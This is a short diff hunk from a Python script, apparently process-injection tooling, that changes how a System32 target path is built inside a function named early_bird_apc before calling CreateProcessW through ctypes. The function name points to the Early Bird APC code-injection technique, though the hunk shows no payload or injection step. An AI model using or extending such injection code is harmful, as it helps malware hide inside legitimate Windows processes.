@@ -293,7 +293,7 @@ def early_bird_apc():
     si.cb = ctypes.sizeof(STARTUPINFO)
     pi = PROCESS_INFORMATION()
     
-    target_path = f"C:\\\\Windows\\\\System32\\\\{TARGET}"
+    target_path = "C:\\\\Windows\\\\System32\\\\" + TARGET
     
     success = kernel32.CreateProcessW(
         target_path,
